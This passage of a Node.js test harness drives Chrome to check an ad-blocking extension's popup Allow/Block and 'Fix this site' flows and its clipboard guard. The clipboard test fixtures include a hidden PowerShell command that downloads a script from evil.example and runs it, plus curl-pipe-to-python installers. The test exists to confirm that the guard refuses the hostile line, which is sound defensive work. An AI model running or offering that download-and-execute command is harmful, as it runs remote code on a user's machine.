    const nums = `requests: ${counts(before)} at start, ${counts(allowed)} after Allow, ${counts(again)} after Block again; button "${label1}" then "${blockText}"; consent banner ${info.consent ? "shown" : "none"}; popup errors ${errs.length}; ${shotA}`;
    const why = [
      !saved && "Allow did not save the site", !rule && "no allow rule after Allow",
      !listsOff(before, allowed) && "after Allow not clearly more requests passed",
      !unsaved && "Block again did not save", !ruleGone && "allow rule still there after Block again",
      !listsOn(before, again) && "after Block again the requests were not blocked again",
      errs.length && "popup.js errors",
    ].filter(Boolean);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + nums, data };
  }, cleanup));
  // F2: Fix this site, the two-step test of PR 30, answered No twice.
  if (fixNo) results.push(await check(`F-${site.id}-fix`, `Fix this site on ${host}: step 1 (hiding and guards off), No, step 2 (ad lists off), No ${VIA}`, 240000, async (at, n) => {
    const page = await fresh(at);
    const before = adStats(page);
    let p = await openPopup(page, host);
    if (p.readyMs === null) return { status: "FAIL", line: `popup not ready (${p.state && p.state.host})` };
    if (!p.state.fixOn) return { status: "SKIP", line: "the popup does not offer Fix this site on this page" };
    const errs = [];
    await popupClick(p.session, "fix-site");
    const ask1 = await poll(async () => { const s = await evalIn(ext, p.session, POPUP_STATE); return s.askShown ? s : null; }, 8000);
    const feats = await poll(async () => { const o = await overridesOf(host); return o && o.features && o.features.cosmetic === false ? o.features : null; }, 8000);
    errs.push(...p.popupErrors);
    await closePopups();
    const step1 = await load(page);
    const info1 = await pageInfo(page);
    const shot1 = await shot(page, `F-${site.id}-fix-step1-try${n}`);
    // The popup reads the tab once, so open it again after the reload.
    p = await openPopup(page, host);
    const stillAsk = !!(p.state && p.state.askShown);
    if (p.session) await popupClick(p.session, "fix-no");
    const offerLists = await poll(async () => { const s = await evalIn(ext, p.session, POPUP_STATE); return s.listsShown ? s : null; }, 8000);
    const featsBack = await poll(async () => { const o = await overridesOf(host); return !o || !o.features || o.features.cosmetic !== false; }, 8000);
    if (offerLists) await popupClick(p.session, "fix-lists");
    const rule2 = offerLists ? await poll(() => allowRuleFor(host), 10000) : false;
    errs.push(...p.popupErrors);
    await closePopups();
    const step2 = offerLists ? await load(page) : null;
    p = await openPopup(page, host);
    const ask2 = !!(p.state && p.state.askShown);
    if (p.session && ask2) await popupClick(p.session, "fix-no");
    const note2 = p.session ? await poll(async () => { const s = await evalIn(ext, p.session, POPUP_STATE); return s.note ? s.note : null; }, 8000) : "";
    const ruleGone = await poll(async () => !(await allowRuleFor(host)), 10000);
    const overrideEnd = await overridesOf(host);
    errs.push(...p.popupErrors);
    await closePopups();
    const end = await load(page);
    const data = { before, ask1, feats, step1, info1, stillAsk, offerLists: !!offerLists, featsBack, rule2, step2, ask2, note2, ruleGone, overrideEnd, end, popupErrors: errs };
    const nums = `requests: ${counts(before)} at start, ${counts(step1)} in step 1, ${step2 ? counts(step2) : "-"} in step 2, ${counts(end)} at the end; consent banner ${info1.consent ? "shown" : "none"}; step 1 scope "${ask1 ? ask1.scope.slice(0, 90) : ""}"; popup errors ${errs.length}; ${shot1}`;
    const why = [
      !ask1 && "step 1 question did not show", !feats && "Fix did not turn off ad box hiding",
      !listsOn(before, step1) && "step 1 let requests through (the lists must stay on)",
      info1.textLen < 200 && "page empty in step 1",
      !stillAsk && "after reload the popup did not ask again", !offerLists && "No did not offer Test with the ad lists off",
      !featsBack && "No did not turn ad box hiding back on", offerLists && !rule2 && "step 2 made no allow rule",
      step2 && !listsOff(before, step2) && "step 2 did not let clearly more requests through",
      !ask2 && "step 2 question did not show after reload", !ruleGone && "allow rule still there after the second No",
      overrideEnd && overrideEnd.enabled === false && "site still allowed at the end",
      !listsOn(before, end) && "requests not blocked again at the end",
      errs.length && "popup.js errors",
    ].filter(Boolean);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + nums, data };
  }, cleanup));
  // F3: Fix this site, Yes (the fix stays), then Undo fix.
  if (fixYes) results.push(await check(`F-${site.id}-fix-yes`, `Fix this site on ${host}, Yes: hiding stays off and Undo fix shows; Undo fix: hiding back on ${VIA}`, 180000, async (at, n) => {
    const page = await fresh(at);
    const boxes = () => evalIn(ext, page.sessionId, AD_BOXES, 10000).then((b) => b.adBoxes || 0).catch(() => { guard(); return -1; });
    const boxes0 = await boxes();
    let p = await openPopup(page, host);
    if (p.readyMs === null) return { status: "FAIL", line: `popup not ready (${p.state && p.state.host})` };
    if (!p.state.fixOn) return { status: "SKIP", line: "the popup does not offer Fix this site on this page" };
    const errs = [];
    await popupClick(p.session, "fix-site");
    const feats = await poll(async () => { const o = await overridesOf(host); return o && o.features && o.features.cosmetic === false; }, 8000);
    errs.push(...p.popupErrors);
    await closePopups();
    await load(page);
    const boxes1 = await boxes();
    p = await openPopup(page, host);
    const ask = !!(p.state && p.state.askShown);
    // Yes closes the popup window: read storage, not the popup.
    if (p.session && ask) await popupClick(p.session, "fix-yes").catch(() => false);
    const answered = await poll(async () => !(await swEval(`chrome.storage.local.get('popupFix').then((s) => { const f = s.popupFix; return !!f && (f.host === ${JSON.stringify(host)} || !!(f.others && f.others[${JSON.stringify(host)}])); })`)), 8000);
    await sleep(2000);
    const o1 = await overridesOf(host);
    const kept = !!(o1 && o1.features && o1.features.cosmetic === false);
    errs.push(...p.popupErrors);
    await closePopups();
    p = await openPopup(page, host);
    const undoShown = !!(p.state && p.state.undoShown);
    if (p.session && undoShown) await popupClick(p.session, "undo-fix");
    const restored = await poll(async () => { const o = await overridesOf(host); return !o || !o.features || o.features.cosmetic !== false; }, 8000);
    errs.push(...p.popupErrors);
    await closePopups();
    await load(page);
    const boxes2 = await boxes();
    const shotEnd = await shot(page, `F-${site.id}-fix-yes-end-try${n}`);
    const boxJudged = boxes1 >= 3 && boxes1 > boxes0;
    const data = { feats, ask, answered, kept, undoShown, restored, boxes0, boxes1, boxes2, popupErrors: errs };
    const nums = `visible ad boxes: ${boxes0} at start, ${boxes1} with the fix, ${boxes2} after Undo fix${boxJudged ? "" : " (box part not judged: the fix showed no more boxes)"}; question after reload ${ask ? "shown" : "missing"}, Undo fix ${undoShown ? "shown" : "missing"}; popup errors ${errs.length}; ${shotEnd}`;
    const why = [
      !feats && "Fix did not turn off ad box hiding", !ask && "after reload the popup did not ask", !answered && "Yes did not close the question",
      !kept && "after Yes ad box hiding did not stay off", !undoShown && "the popup did not offer Undo fix", !restored && "Undo fix did not turn ad box hiding back on",
      boxJudged && boxes2 > Math.max(1, Math.floor(boxes1 / 2)) && "after Undo fix the ad boxes were not hidden again",
      errs.length && "popup.js errors",
    ].filter(Boolean);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + nums, data };
  }, cleanup));
  return results;
}

// ---------- G: clipboard guard ----------
// Each button writes one text with navigator.clipboard.writeText on a click.
const CLIP_CASES = {
  "gecko-bad": 'powershell -w hidden -c "iwr http://evil.example/x.ps1 | iex"',
  "gecko-ok": "hello world",
  // Guard changes of #36: a "-w 1" inside a payload is not the hidden window switch.
  "gecko-ping": "powershell -Command \"Test-Connection 192.0.2.1 -Count 1; ping -w 1 192.0.2.1\"",
};
// On a safe host of the guard (python-poetry.org) the install commands are written.
const CLIP_SAFE_CASES = {
  "gecko-poetry": "curl -sSL https://install.python-poetry.org | python3 -",
  "gecko-getpip": "curl https://bootstrap.pypa.io/get-pip.py | python",
};
const CLIP_INJECT = (cases) => `(() => {
  window.__clip = [];
  let top = 20;
  for (const [id, text] of Object.entries(${JSON.stringify(cases)})) {
    const b = document.createElement("button");
    b.id = id; b.textContent = id;
    b.style.cssText = "position:fixed;left:20px;top:" + top + "px;width:200px;height:40px;z-index:2147483647";
    b.addEventListener("click", () => navigator.clipboard.writeText(text).then(() => __clip.push(id + " written"), (e) => __clip.push(id + " refused " + e.name)));
    document.documentElement.appendChild(b);
    top += 60;
  }
  return true;
})()`;
// Ctrl+C of the page's own first visible heading or paragraph: the clipboard then holds the selection.
const SELECT_H1 = `(() => { const h = [...document.querySelectorAll("h1, h2, #mw-content-text p")].find((e) => e.getBoundingClientRect().height > 5 && (e.innerText || "").trim().length > 3); if (!h) return ""; const r = document.createRange(); r.selectNodeContents(h); const s = getSelection(); s.removeAllRanges(); s.addRange(r); return s.toString(); })()`;
async function clipRun(c, at, site, cases, ctrlC) {
  const origin = new URL(site).origin;
  await c.send("Browser.grantPermissions", { origin, permissions: ["clipboardReadWrite", "clipboardSanitizedWrite"] });
  const page = await openPage(c, site, at, { focus: true });
  await waitLoad(page, 20000);
  await sleep(1000);
  const info = await pageInfo(page);
  await evalIn(c, page.sessionId, CLIP_INJECT(cases));
  for (const id of Object.keys(cases)) {
    await clickEl(c, page.sessionId, `document.getElementById(${JSON.stringify(id)})`);
    await sleep(800);
  }
  const log = await evalIn(c, page.sessionId, "window.__clip");
  const res = { log, page, info };
  if (ctrlC) {
    const sel = await evalIn(c, page.sessionId, SELECT_H1);
    await evalIn(c, page.sessionId, "navigator.clipboard.writeText('before copy').then(() => true, () => false)");
    for (const type of ["rawKeyDown", "keyUp"]) await c.send("Input.dispatchKeyEvent", { type, key: "c", code: "KeyC", windowsVirtualKeyCode: 67, modifiers: 2, commands: type === "rawKeyDown" ? ["copy"] : [] }, page.sessionId);
    await sleep(800);
    const got = await evalIn(c, page.sessionId, "navigator.clipboard.readText().catch((e) => 'error ' + e.name)");
    res.copy = { selection: String(sel).trim().slice(0, 80), clipboard: String(got).trim().slice(0, 80) };
    res.copy.ok = !!res.copy.selection && res.copy.selection === res.copy.clipboard;
  }
  return res;
}
async function checkClipboard() {
  return check("G-clipboard", "clipboard guard on a live page: PowerShell download command refused; plain text, a ping -w 1 command and installers on a safe host written; Ctrl+C copies the selection", 90000, async (at, n) => {
    // One after the other: in a headful run both browsers share the OS clipboard.
    const re = await clipRun(ext, at, CLIP_SITE, CLIP_CASES, true);
    const s = await shot(re.page, `G-clipboard-ext-try${n}`);
    const rb = await clipRun(base, at, CLIP_SITE, CLIP_CASES, true);
    const se = await clipRun(ext, at, CLIP_SAFE_SITE, CLIP_SAFE_CASES, false);
    const sb = await clipRun(base, at, CLIP_SAFE_SITE, CLIP_SAFE_CASES, false);
    const data = { ext: re.log, base: rb.log, safeExt: se.log, safeBase: sb.log, copyExt: re.copy, copyBase: rb.copy, safeHost: new URL(CLIP_SAFE_SITE).hostname };
    const nums = `with the extension: ${[...re.log, ...se.log].join(", ")}, Ctrl+C ${re.copy.ok ? "copied" : "did not copy"} ("${re.copy.selection}" -> "${re.copy.clipboard}"); without: ${[...rb.log, ...sb.log].join(", ")}, Ctrl+C ${rb.copy.ok ? "copied" : "did not copy"}; ${s}`;
    if (!rb.log.includes("gecko-bad written")) return { status: "SKIP", line: "the baseline could not write either, the test is not valid here; " + nums, data };
    const has = (log, x) => log.includes(x);
    const why = [
      !has(re.log, "gecko-bad refused NotAllowedError") && "the PowerShell download command was not refused",
      !has(re.log, "gecko-ok written") && "plain text was not written",
      has(rb.log, "gecko-ping written") && !has(re.log, "gecko-ping written") && "the ping -w 1 command was refused (false block)",
      has(sb.log, "gecko-poetry written") && !has(se.log, "gecko-poetry written") && "the Poetry install line was refused on python-poetry.org",
      has(sb.log, "gecko-getpip written") && !has(se.log, "gecko-getpip written") && "the get-pip line was refused on python-poetry.org",
      rb.copy.ok && !re.copy.ok && "Ctrl+C of the selection did not copy",
    ].filter(Boolean);
    const notJudged = [!sb.log.length && "safe host page (no write in the baseline)", !rb.copy.ok && "Ctrl+C (no copy in the baseline)"].filter(Boolean);
    return { status: why.length ? "FAIL" : "PASS", line: (why.length ? why.join("; ") + "; " : "") + (notJudged.length ? "not judged: " + notJudged.join(", ") + "; " : "") + nums, data };
  });
}

// ---------- main ----------
let shutdownP = null;
let t0Run = Date.now();
// Closes both browsers once and removes their profiles (also on Ctrl+C).
function shutdown() {
  if (shutdownP) return shutdownP;
  shutdownP = (async () => {
    report.env.workerErrors = workerErrors.length;
    report.env.workerErrorSample = workerErrors[0] || "";
    const open = [ext, base].filter(Boolean);
    const cleaned = await Promise.all(open.map((c) => c.closeClean().catch(() => ({ profile: c.profile, removed: !fs.existsSync(c.profile) }))));
    report.env.profiles = cleaned.map((c) => path.basename(c.profile) + (c.removed ? "" : " (still there)"));
    report.env.profilesRemoved = cleaned.every((c) => c.removed);
    report.finished = new Date().toISOString();
    report.seconds = Math.round((Date.now() - t0Run) / 1000);
    writeReport();
  })();
  return shutdownP;
}
function onSignal(sig) {
  console.error(`\n${sig}: closing both browsers and removing the throwaway profiles…`);
  report.interrupted = true;
  shutdown().finally(() => {
    console.log("Report: " + path.join(OUT, "report.md"));
    process.exit(130);
  });
}
for (const sig of ["SIGINT", "SIGTERM", "SIGBREAK"]) process.once(sig, () => onSignal(sig));
// Test hook for the Ctrl+C path: ADGECKO_LIVE_TEST_SIGINT_MS=<ms> sends SIGINT to itself.
if (process.env.ADGECKO_LIVE_TEST_SIGINT_MS) setTimeout(() => process.emit("SIGINT", "SIGINT"), Number(process.env.ADGECKO_LIVE_TEST_SIGINT_MS));

async function main() {
  if (!CHROME || !fs.existsSync(CHROME)) throw new Error("set CHROME_PATH or --chrome to Chrome for Testing");
  if (!fs.existsSync(path.join(EXT_DIR, "manifest.json"))) throw new Error("no manifest.json in --dir");
  fs.mkdirSync(OUT, { recursive: true });
  t0Run = Date.now();
  report.env.extVersion = JSON.parse(fs.readFileSync(path.join(EXT_DIR, "manifest.json"), "utf8")).version;
  try {
    const [le, lb] = await Promise.allSettled([launch(true), launch(false)]);
    if (le.status === "fulfilled") ext = le.value;
    if (lb.status === "fulfilled") base = lb.value;
    if (!ext || !base) throw new Error("Chrome did not start: " + [le, lb].filter((x) => x.status === "rejected").map((x) => x.reason && x.reason.message).join("; "));
    const version = await ext.send("Browser.getVersion");
    report.env.chrome = version.product;
    UA = makeUa(version);
    report.env.userAgent = UA.userAgent;
    // Both browsers: what a site sees.
    const probe = { pages: [] };
    for (const [name, c] of [["ext", ext], ["base", base]]) {
      const p = await openPage(c, CLIP_SITE, probe);
      await waitLoad(p, 15000);
      const v = await evalIn(c, p.sessionId, "({ ua: navigator.userAgent, webdriver: navigator.webdriver, brands: (navigator.userAgentData ? navigator.userAgentData.brands.map((b) => b.brand).join(', ') : '') })").catch((e) => ({ error: e.message }));
      report.env["probe_" + name] = v;
      await closePage(p);
    }
    report.env.webdriver = `${report.env.probe_ext.webdriver} (extension), ${report.env.probe_base.webdriver} (baseline)`;
    // The worker starts, installs the packed lists, and a fresh install
    // downloads the lists at once. Wait for that refresh to end (it writes
    // the list status text), so every check sees the same list state.
    const found = await poll(() => worker().then(() => true), 15000, 200);
    if (!found) throw new Error("the service worker did not start (Google Chrome 137+ ignores --load-extension: use Chrome for Testing)");
    ext.on((m) => {
      if (m.sessionId !== swSession) return;
      if (m.method === "Runtime.exceptionThrown") workerErrors.push(((m.params.exceptionDetails.exception || {}).description || m.params.exceptionDetails.text || "").slice(0, 160));
      if (m.method === "Runtime.consoleAPICalled" && m.params.type === "error") workerErrors.push((m.params.args || []).map((a) => a.value || a.description || "").join(" ").slice(0, 160));
    });
    const status = await poll(() => swEval("chrome.storage.local.get(['generalListStatus', 'generalListUpdatedAt', 'cosMeta']).then((s) => s.generalListStatus ? s : null)"), 120000, 1000);
    report.env.listStatus = status ? `${status.generalListStatus} (updated ${status.generalListUpdatedAt ? new Date(status.generalListUpdatedAt).toISOString() : "never"}; hide rules ${status.cosMeta ? status.cosMeta.count + " keys" : "none"})` : "the list refresh did not end within 120 s";
    console.log("Lists: " + report.env.listStatus);
    console.log("User agent: " + report.env.userAgent + "; webdriver " + report.env.webdriver);
    writeReport();

    if (want("A")) {
      for (const s of NEWS) { await checkPopup(s, "loaded"); await checkPopup(s, "loading"); }
      await checkBusy(NEWS[0]);
    }
    if (want("B")) {
      for (const s of NEWS) await checkNewsAds(s);
      await checkLoop(NEWS[0]);
    }
    if (want("F")) {
      await checkActions(ACTION_SITE);
      // cnn.com is the open PR 30 item: the two-step Fix there too.
      await checkActions(NEWS[0], { allow: false, fixYes: false });
    }
    if (want("C")) for (const s of ORDINARY) await checkOrdinary(s);
    if (want("G")) await checkClipboard();
    if (want("D")) {
      await checkYouTube();
      await checkYouTubeChain();
      await checkYouTubeButtons();
    }
    if (want("E")) {
      await checkStream("twitch", "https://www.twitch.tv/directory/all", TWITCH_FINDER, TWITCH_AD);
      await checkStream("kick", "https://kick.com/", KICK_FINDER, KICK_AD);
    }
    // A worker that throws must fail the run, even when every page looks fine.
    const xw = { id: "X-worker-errors", title: "no service worker errors during the run", status: workerErrors.length ? "FAIL" : "PASS", line: workerErrors.length ? `${workerErrors.length} errors; first: ${workerErrors[0]}` : "0 errors", retried: false, tries: [] };
    report.checks.push(xw);
    console.log(`${xw.status.padEnd(4)}  ${xw.id}  ${xw.title}  (${xw.line})`);
  } finally {
    await shutdown();
  }
}

main().then(() => {
  const failed = count("FAIL");
  const ran = report.checks.filter((c) => c.id !== "X-worker-errors").length;
  console.log(`RESULT: ${count("PASS")} PASS, ${failed} FAIL, ${count("SKIP")} SKIP. Throwaway profiles removed: ${report.env.profilesRemoved ? "yes" : "NO"}`);
  if (!ran) console.log("No check ran: exit code 1.");
  console.log("Report: " + path.join(OUT, "report.md"));
  process.exit(failed || !ran || !report.env.profilesRemoved ? 1 : 0);
}, async (e) => {
  console.error("ERROR: " + (e && e.message || e));
  try { writeReport(); } catch { /* no folder */ }
  console.log("Report: " + path.join(OUT, "report.md"));
  process.exit(1);
});
